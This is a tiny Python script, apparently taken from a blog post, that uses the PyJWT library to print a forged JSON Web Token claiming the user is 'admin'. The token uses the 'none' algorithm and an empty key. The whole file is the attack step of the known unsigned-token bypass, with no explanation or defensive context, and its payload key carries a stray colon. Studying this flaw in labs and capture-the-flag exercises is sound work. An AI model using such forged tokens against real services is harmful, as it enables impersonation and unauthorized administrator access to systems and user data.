# https://www.cnblogs.com/zhangzhijie98/p/13356388.html
import jwt

print(jwt.encode({'username:':'admin'}, algorithm="none", key=""))
